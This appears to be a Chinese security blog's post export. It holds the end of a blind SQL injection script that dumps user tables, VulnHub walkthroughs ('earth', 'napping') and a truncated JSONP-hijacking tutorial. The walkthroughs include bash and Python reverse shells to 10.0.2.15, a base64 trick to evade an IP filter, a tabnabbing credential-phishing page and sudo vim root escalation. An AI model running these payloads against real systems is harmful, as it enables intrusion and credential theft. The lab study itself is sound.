&quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;&#125;</span><br><span class=\"line\">        html = requests.post(host, data)</span><br><span class=\"line\">        # 如果返回的是有数据，那么就为真的</span><br><span class=\"line\">        if &quot;flag.jpg&quot; in html.text:</span><br><span class=\"line\">            high = mid</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            low = mid + 1</span><br><span class=\"line\">        mid = (low + high) // 2</span><br><span class=\"line\">        if mid &lt;= 32 or mid &gt;= 127:</span><br><span class=\"line\">            break</span><br><span class=\"line\">        ans += chr(mid - 1)</span><br><span class=\"line\">        print(&quot;table is -&gt; &quot; + ans)</span><br><span class=\"line\">    # 返回表名，此时表名为一个列表</span><br><span class=\"line\">    return ans</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def getColumn(TBname):</span><br><span class=\"line\">    # 获取列名</span><br><span class=\"line\">    global host</span><br><span class=\"line\">    ans = &#x27;&#x27;</span><br><span class=\"line\">    for i in range(1, 1000):</span><br><span class=\"line\">        low = 32</span><br><span class=\"line\">    high = 128</span><br><span class=\"line\">    mid = (low + high) // 2</span><br><span class=\"line\">    while low &lt; high:</span><br><span class=\"line\">        payload = &quot;admin&#x27; and (ascii(substr((select(group_concat(column_name))from (information_schema.columns)where(table_name=&#x27;&#123;0&#125;&#x27;)), &#123;1&#125;, 1)) &lt; &#123;2&#125;)-- p&quot;.format(</span><br><span class=\"line\">            TBname, i, mid)</span><br><span class=\"line\">        data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;&#125;</span><br><span class=\"line\">        html = requests.post(host, data)</span><br><span class=\"line\">        # 如果返回的是有数据，那么就为真的</span><br><span class=\"line\">        if &quot;flag.jpg&quot; in html.text:</span><br><span class=\"line\">            high = mid</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            low = mid + 1</span><br><span class=\"line\">        mid = (low + high) // 2</span><br><span class=\"line\">        if mid &lt;= 32 or mid &gt;= 127:</span><br><span class=\"line\">            break</span><br><span class=\"line\">        ans += chr(mid - 1)</span><br><span class=\"line\">        print(&quot;column is -&gt; &quot; + ans)</span><br><span class=\"line\">    # 返回一个列名</span><br><span class=\"line\">    return ans</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def dumpTable():</span><br><span class=\"line\">    # 脱裤</span><br><span class=\"line\">    global host</span><br><span class=\"line\">    ans = &#x27;&#x27;</span><br><span class=\"line\">    for i in range(1, 1000):</span><br><span class=\"line\">        low = 32</span><br><span class=\"line\">        high = 128</span><br><span class=\"line\">        mid = (low + high) // 2</span><br><span class=\"line\">        while low &lt; high:</span><br><span class=\"line\">            time.sleep(0.3)</span><br><span class=\"line\">            payload = &quot;admin&#x27; and(ascii(substr((select(group_concat(username, password))from (users)), % d, 1)) &lt; % d)-- p&quot; % (</span><br><span class=\"line\">                i, mid)</span><br><span class=\"line\">            data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;&#125;</span><br><span class=\"line\">            html = requests.post(host, data)</span><br><span class=\"line\">            # 如果返回的是有数据，那么就为真的</span><br><span class=\"line\">            if &quot;flag.jpg&quot; in html.text:</span><br><span class=\"line\">                high = mid</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                low = mid + 1</span><br><span class=\"line\">            mid = (low + high) // 2</span><br><span class=\"line\">            if mid &lt;= 32 or mid &gt;= 127:</span><br><span class=\"line\">                break</span><br><span class=\"line\">            ans += chr(mid - 1)</span><br><span class=\"line\">            print(&quot;dumpTable is -&gt; &quot; + ans)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    getDatabase()</span><br><span class=\"line\">    TBname = getTable()</span><br><span class=\"line\">    print(type(TBname))</span><br><span class=\"line\">    # 表示是一个字符串，用来测试</span><br><span class=\"line\">    TBnames = []</span><br><span class=\"line\">    TBnames.append(TBname.split(&#x27;,&#x27;))</span><br><span class=\"line\">    # 因为输出的是一个二元数组，所以使用下面的代码来转为一维数组</span><br><span class=\"line\">    TBnames = TBnames[0]</span><br><span class=\"line\">    print(TBnames)</span><br><span class=\"line\">    TBlen = len(TBnames)</span><br><span class=\"line\">    for i in range(0, TBlen):</span><br><span class=\"line\">        TBname = TBnames[i]</span><br><span class=\"line\">        print(TBname)</span><br><span class=\"line\">        getColumn(TBname)</span><br><span class=\"line\">        if i == TBlen - 1:</span><br><span class=\"line\">            break</span><br><span class=\"line\">        dumpTable()</span><br></pre></td></tr></table></figure>\n\n<p>运行结果就不放出来了。</p>\n","categories":["web安全学习"],"tags":["web","安全"]},{"title":"earth","url":"/2023/06/07/earth/","content":"<p>靶机下载地址：<a href=\"https://www.vulnhub.com/entry/the-planets-earth,755/\">https://www.vulnhub.com/entry/the-planets-earth,755/</a></p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>先获取IP地址，使用<code>sudo arp-scan -I eth0 -l</code></p>\n<p><img src=\"/images/earth/image-20230607163117126.png\"></p>\n<p>然后使用nmap获取端口信息，<code>nmap -sC -sV -p 1-10000 -o result.txt 10.0.2.7</code></p>\n<p>访问<code>10.0.2.7</code>发现会显示Bad Request</p>\n<p><img src=\"/images/earth/image-20230607163417473.png\"></p>\n<p>然后扫描发现443端口有DNS解析</p>\n<p><img src=\"/images/earth/image-20230607164733990.png\"></p>\n<p>将其加入hosts文件中，可以成功解析</p>\n<p><img src=\"/images/earth/image-20230607163621518.png\"></p>\n<p>使用<code>https://terratest.earth.local/</code>和<code>http://terratest.earth.local/</code>分别访问（其他师傅是分别访问主域名和子域名）</p>\n<p><img src=\"/images/earth/image-20230607163745111.png\"></p>\n<p><img src=\"/images/earth/image-20230607163754493.png\"></p>\n<p>然后使用<code>dirsearch</code>扫描发现了一些文件信息</p>\n<p><img src=\"/images/earth/image-20230607163853592.png\"></p>\n<p><img src=\"/images/earth/image-20230607164029240.png\"></p>\n<h2 id=\"外网渗透\"><a href=\"#外网渗透\" class=\"headerlink\" title=\"外网渗透\"></a>外网渗透</h2><p>访问<code>robots.txt</code>发现了一些信息，<code>testingnotes.*</code>文件经过测试发现是<code>testingnotes.txt</code>，然后进行访问</p>\n<p><img src=\"/images/earth/image-20230607164119875.png\"></p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">Testing secure messaging system notes:</span><br><span class=\"line\">*Using XOR encryption as the algorithm, should be safe as used in RSA.</span><br><span class=\"line\">*Earth has confirmed they have received our sent messages.</span><br><span class=\"line\">*testdata.txt was used to test encryption.</span><br><span class=\"line\">*terra used as username for admin portal.</span><br><span class=\"line\">Todo:</span><br><span class=\"line\">*How do we send our monthly keys to Earth securely? Or should we change keys weekly?</span><br><span class=\"line\">*Need to test different key lengths to protect against bruteforce. How long should the key be?</span><br><span class=\"line\">*Need to improve the interface of the messaging interface and the admin panel, it&#x27;s currently very basic.</span><br></pre></td></tr></table></figure>\n\n<p>访问<code>testdata.txt</code></p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span><br></pre></td></tr></table></figure>\n\n<p>根据意思进行解密：<br><img src=\"/images/earth/image-20230607164402194.png\"></p>\n<blockquote>\n<p>key值：</p>\n</blockquote>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/earth/image-20230607164452241.png\"></p>\n<p>得到密码为<code>earthclimatechangebad4humans</code>，上面已知账号为<code>terra</code>，然后在<code>http://terratest.earth.local/admin/</code>中进行登录</p>\n<p>可以执行命令</p>\n<p><img src=\"/images/earth/image-20230607164609896.png\"></p>\n<p>进行反弹shell</p>\n<blockquote>\n<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.2.15&#x2F;7777 0&amp;&gt;1</p>\n</blockquote>\n<p><img src=\"/images/earth/image-20230607164902017.png\"></p>\n<p>发现没有反应，经过测试发现会过滤IP地址</p>\n<p><img src=\"/images/earth/image-20230607164949823.png\"></p>\n<p>这里使用base64编码进行绕过</p>\n<blockquote>\n<p>echo “YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTUvNzc3NyAwPiYx” | base64 -d|bash</p>\n</blockquote>\n<p><img src=\"/images/earth/image-20230607165122611.png\"></p>\n<h2 id=\"内网渗透\"><a href=\"#内网渗透\" class=\"headerlink\" title=\"内网渗透\"></a>内网渗透</h2><p>查看是否有python的环境：<code>whereis python</code></p>\n<p><img src=\"/images/earth/image-20230607165238502.png\"></p>\n<p>使用python获取更高级的shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">export TERM=xterm</span><br><span class=\"line\">然后使用Crtl+Z将反弹shell置于后台</span><br><span class=\"line\">再使用\tstty raw -echo;fg;reset\t重新获取shell</span><br><span class=\"line\">shell就成功升级了</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/earth/image-20230607165445357.png\"></p>\n<p>使用<code>locate &quot;flag&quot;</code>成功获取第一个flag</p>\n<p><img src=\"/images/earth/image-20230607165543607.png\"></p>\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>使用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>获取具有SUID的二进制文件</p>\n<p><img src=\"/images/earth/image-20230607165646016.png\"></p>\n<p>但是无法进行运行</p>\n<p><img src=\"/images/earth/image-20230607165716134.png\"></p>\n<p>缺少了什么东西，将其下载到本地，使用nc下载二进制文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">在本地运行：nc -lp 7778 &gt; reset_root</span><br><span class=\"line\">然后在靶机运行：nc -w 3 10.0.2.15[宿主机IP] 7778 &lt; /usr/bin/reset_root</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/earth/image-20230607170024940.png\"></p>\n<p><img src=\"/images/earth/image-20230607170037155.png\"></p>\n<p>然后使用<code>ltrace</code>运行程序</p>\n<blockquote>\n<p>ltrace：一个简单的程序，它将执行二进制文件直到或除非它退出。它将告诉我们所有库调用并拦截二进制文件进行的系统调用</p>\n</blockquote>\n<p><img src=\"/images/earth/image-20230607170243870.png\"></p>\n<p>要创建三个文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">touch /dev/shm/kHgTFI5G</span><br><span class=\"line\">touch /dev/shm/Zw7bV9U5</span><br><span class=\"line\">touch /tmp/kcM0Wewe</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/earth/image-20230607170408204.png\"></p>\n<p>重置密码为<code>Earth</code>，使用<code>su root</code>进行登录</p>\n<p><img src=\"/images/earth/image-20230607170458205.png\"></p>\n","categories":["vulnhub"],"tags":["vulnhub","内网"]},{"title":"napping","url":"/2023/06/09/napping/","content":"<p>靶机下载地址：<a href=\"https://www.vulnhub.com/entry/napping-101,752/\">https://www.vulnhub.com/entry/napping-101,752/</a></p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>使用<code>sudo arp-scan -I eth0 -l</code>获取主机IP地址</p>\n<p><img src=\"/images/napping/image-20230609112341966.png\" alt=\"image-20230609112341966\"></p>\n<p>使用nmap进行扫描，<code>nmap -sC -sV -p 1-10000 -o result.txt 10.0.2.9</code></p>\n<p><img src=\"/images/napping/image-20230609112432317.png\" alt=\"image-20230609112432317\"></p>\n<p><img src=\"/images/napping/image-20230609112510535.png\" alt=\"image-20230609112510535\"></p>\n<h2 id=\"外网渗透\"><a href=\"#外网渗透\" class=\"headerlink\" title=\"外网渗透\"></a>外网渗透</h2><p>首先注册一个账号进行登录</p>\n<p><img src=\"/images/napping/image-20230609112634759.png\" alt=\"image-20230609112634759\"></p>\n<p>输入一个URL，查看源码发现有记录</p>\n<p><img src=\"/images/napping/image-20230609112712834.png\" alt=\"image-20230609112712834\"></p>\n<p>因为写了投稿，后台可能会进行检查吧，就可能存在钓鱼……</p>\n<p>然后将前端页面使用wget下载下来，然后伪造一个钓鱼页面</p>\n<blockquote>\n<p>monkey111.html[钓鱼页面]</p>\n</blockquote>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    \t<span class=\"keyword\">if</span>(<span class=\"variable language_\">window</span>.<span class=\"property\">opener</span>) <span class=\"variable language_\">window</span>.<span class=\"property\">opener</span>.<span class=\"property\">parent</span>.<span class=\"property\">location</span>.<span class=\"title function_\">replace</span>(<span class=\"string\">&#x27;http://10.0.2.15:8000/index.html&#x27;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    \t<span class=\"keyword\">if</span>(<span class=\"variable language_\">window</span>.<span class=\"property\">opener</span>  != <span class=\"variable language_\">window</span>) <span class=\"variable language_\">window</span>.<span class=\"property\">opener</span>.<span class=\"property\">parent</span>.<span class=\"property\">location</span>.<span class=\"title function_\">replace</span>(<span class=\"string\">&#x27;http://10.0.2.15:8000/index.html&#x27;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>然后使用<code>python3 -m http.server 80</code>开启http服务，使用<code>nc -lvnp 8000</code>监听8000端口</p>\n<p>链接填写钓鱼页面链接</p>\n<p><img src=\"/images/napping/image-20230609113336548.png\" alt=\"image-20230609113336548\"></p>\n<p><img src=\"/images/napping/image-20230609113353220.png\" alt=\"image-20230609113353220\"></p>\n<p><img src=\"/images/napping/image-20230609113402284.png\" alt=\"image-20230609113402284\"></p>\n<blockquote>\n<p>username&#x3D;daniel</p>\n<p>password&#x3D;C@ughtm3napping123</p>\n</blockquote>\n<p>参试网站进行登录发现失败了，这是我们会想到还有ssh服务可以参试，发现成功登录</p>\n<p><img src=\"/images/napping/image-20230609113530928.png\" alt=\"image-20230609113530928\"></p>\n<h2 id=\"内网渗透\"><a href=\"#内网渗透\" class=\"headerlink\" title=\"内网渗透\"></a>内网渗透</h2><p>使用<code>groups</code>查看发现该用户还有管理员的一点权限</p>\n<p><img src=\"/images/napping/image-20230609113717694.png\" alt=\"image-20230609113717694\"></p>\n<p>使用<code>find / -group administrators -type f 2&gt;/dev/null</code>查看我们使用命令能够访问的文件</p>\n<p><img src=\"/images/napping/image-20230609113806275.png\" alt=\"image-20230609113806275\"></p>\n<p>查看其内容</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> datetime <span class=\"keyword\">import</span> datetime</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">now = datetime.now()</span><br><span class=\"line\"></span><br><span class=\"line\">r = requests.get(<span class=\"string\">&#x27;http://127.0.0.1/&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> r.status_code == <span class=\"number\">200</span>:</span><br><span class=\"line\">    f = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;site_status.txt&quot;</span>,<span class=\"string\">&quot;a&quot;</span>)</span><br><span class=\"line\">    dt_string = now.strftime(<span class=\"string\">&quot;%d/%m/%Y %H:%M:%S&quot;</span>)</span><br><span class=\"line\">    f.write(<span class=\"string\">&quot;Site is Up: &quot;</span>)</span><br><span class=\"line\">    f.write(dt_string)</span><br><span class=\"line\">    f.write(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">    f.close()</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    f = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;site_status.txt&quot;</span>,<span class=\"string\">&quot;a&quot;</span>)</span><br><span class=\"line\">    dt_string = now.strftime(<span class=\"string\">&quot;%d/%m/%Y %H:%M:%S&quot;</span>)</span><br><span class=\"line\">    f.write(<span class=\"string\">&quot;Check Out Site: &quot;</span>)</span><br><span class=\"line\">    f.write(dt_string)</span><br><span class=\"line\">    f.write(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">    f.close()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/napping/image-20230609114319358.png\" alt=\"image-20230609114319358\"></p>\n<p>发现规律，大概是两分钟执行一次，而且执行权限比较高，可以用来提权</p>\n<p><img src=\"/images/napping/image-20230609114411154.png\" alt=\"image-20230609114411154\"></p>\n<p>加入以下内容</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket, subprocess, os</span><br><span class=\"line\">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class=\"line\">s.connect((<span class=\"string\">&quot;10.0.2.15&quot;</span>,<span class=\"number\">8888</span>))</span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">0</span>)</span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">1</span>)</span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">2</span>)</span><br><span class=\"line\">p=subprocess.call([<span class=\"string\">&quot;/bin/sh&quot;</span>,<span class=\"string\">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/napping/image-20230609114452648.png\" alt=\"image-20230609114452648\"></p>\n<p>本地监听端口，然后过一段时间就会反弹shell</p>\n<p><img src=\"/images/napping/image-20230609114607516.png\" alt=\"image-20230609114607516\"></p>\n<p>然后使用python获取更完整的shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">export TERM=xterm-256color</span><br><span class=\"line\">export SHELL=/bin/bash</span><br><span class=\"line\">stty size</span><br><span class=\"line\">\t这里的值是多少，最后的值也要修改为多少</span><br><span class=\"line\">\t</span><br><span class=\"line\">使用Crtl+Z，然后输入下面的内容</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">直接输入下面的内容</span><br><span class=\"line\">\treset</span><br><span class=\"line\">stty rows 0 columns 0</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/napping/image-20230609114833108.png\" alt=\"image-20230609114833108\"></p>\n<p>使用<code>sudo -l</code>获取能执行的命令，发现<code>vim</code>是以root运行的，所以我们可以使用其来提权</p>\n<p><img src=\"/images/napping/image-20230609115218940.png\" alt=\"image-20230609115218940\"></p>\n<p>使用<code>sudo /usr/bin/vim -c &#39;:!/bin/sh&#39;</code>提权</p>\n<p><img src=\"/images/napping/image-20230609115323989.png\" alt=\"image-20230609115323989\"></p>\n<p>使用<code>crontab -l</code>查看定时任务</p>\n<p><img src=\"/images/napping/image-20230609115400172.png\" alt=\"image-20230609115400172\"></p>\n","categories":["vulnhub"],"tags":["vulnhub","内网"]},{"title":"jsonp跨域漏洞","url":"/2023/08/22/jsonp%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/","content":"<p>原文链接：<a href=\"https://xz.aliyun.com/t/12744\">https://xz.aliyun.com/t/12744</a></p>\n<h2 id=\"jsonp\"><a href=\"#jsonp\" class=\"headerlink\" title=\"jsonp\"></a>jsonp</h2><p>jsonp可以理解为就是一种协议，准确点来说就是一种使用模式，是为了解决json受同源策略的问题。</p>\n<p>JSON的基本语法为：<code>callback(&#123;&quot;name&quot;:&quot;test&quot;, &quot;msg&quot;:&quot;success&quot;&#125;)</code></p>\n<p>常见的例子包括函数调用（如<code>callback(&#123;&quot;a&quot;:&quot;b&quot;&#125;)</code>）或变量赋值（<code>var a = &#123;JSON data&#125;</code>）</p>\n<h2 id=\"应用场景\"><a href=\"#应用场景\" class=\"headerlink\" title=\"应用场景\"></a>应用场景</h2><blockquote>\n<p>json</p>\n</blockquote>\n<p>假设172.27.31.188放一个test.json</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span>username<span class=\"punctuation\">:</span> <span class=\"string\">&quot;monkey111&quot;</span><span class=\"punctuation\">,</span> password<span class=\"punctuation\">:</span> <span class=\"string\">&quot;123456&quot;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>这是172.27.31.188下面的html文件需要发送Ajax请求去访问这个test.json文件</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">         $.<span class=\"title function_\">ajax</span>(&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">         <span class=\"attr\">url</span>: <span class=\"string\">&#x27;http://172.27.31.188/test.json&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">         <span class=\"attr\">type</span>:<span class=\"string\">&quot;get&quot;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">         <span class=\"attr\">dataType</span>: <span class=\"string\">&quot;json&quot;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">         <span class=\"attr\">success</span>: <span class=\"keyword\">function</span> (<span class=\"params\">data</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">          <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(data);&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">         &#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>因为此时html文件和test.json同域，所以html文件能够正常获取json文件的内容</p>\n<p><img src=\"/images/jsonp%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/image-20230822140754493.png\" alt=\"image-20230822140754493\"></p>\n<p>然后将html放到本地，代码还是一样的，此时html与test.json不同域，这时去访问index.html，发现受同源策略的限制被拒绝</p>\n<p><img src=\"/images/jsonp%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/image-20230822141000195.png\" alt=\"image-20230822141000195\"></p>\n<p>这个时候就要使用jsonp来解决这个问题了。</p>\n<blockquote>\n<p>jsonp</p>\n</blockquote>\n<p>jsonp简单来说，就是利用script标签的src属性能够跨域请求的原理来实现的。</p>\n<p>因此只需将<code>test.json</code>中的内容按照JavaScript规范去规定，便可以实现跨域资源访问。只需要让目标页面回调本地页面的方法，并带入参数即可，这也就是jsonp的核心原理。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">function</span> <span class=\"title function_\">callback</span>(<span class=\"params\">data</span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"title function_\">alert</span>(<span class=\"string\">&quot;name:&quot;</span>+data.<span class=\"property\">username</span>+<span class=\"string\">&quot;  passwrod:&quot;</span>+data.<span class=\"property\">password</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://172.27.31.188/test.json&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>在test.json中按照<code>javascript</code>代码规范调用<code>callback</code>函数，并将数据作为参数传入</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">callback(<span class=\"punctuation\">&#123;</span> username<span class=\"punctuation\">:</span> <span class=\"string\">&quot;monkey777&quot;</span><span class=\"punctuation\">,</span> password<span class=\"punctuation\">:</span> <span class=\"string\">&quot;123456&quot;</span> <span class=\"punctuation\">&#125;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>此时请求index.html，成功请求跨域json</p>\n<p><img src=\"/images/jsonp%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/image-20230822141529981.png\" alt=\"image-20230822141529981\"></p>\n<h2 id=\"jsonp跨域漏洞\"><a href=\"#jsonp跨域漏洞\" class=\"headerlink\" title=\"jsonp跨域漏洞\"></a>jsonp跨域漏洞</h2><p>jsonp跨域漏洞主要是callback自定义导致的XSS和jsonp劫持。</p>\n<blockquote>\n<p>callback自定义导致xss</p>\n</blockquote>\n<p>我们知道，在jsonp跨域中，我们是可以传入一个函数名的参数如callback，然后jsonp端点会根据我们的传参动态生成jsonp数据响应回来</p>\n<p>如果jsonp端点对于用于传入的函数名参数callback处理不当，如未正确设置响应包的<code>Content-Type</code>、未对用户输入参数进行有效过滤或转义时，就会导致XSS漏洞的产生。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;callback&#x27;</span>]))&#123;</span><br><span class=\"line\">    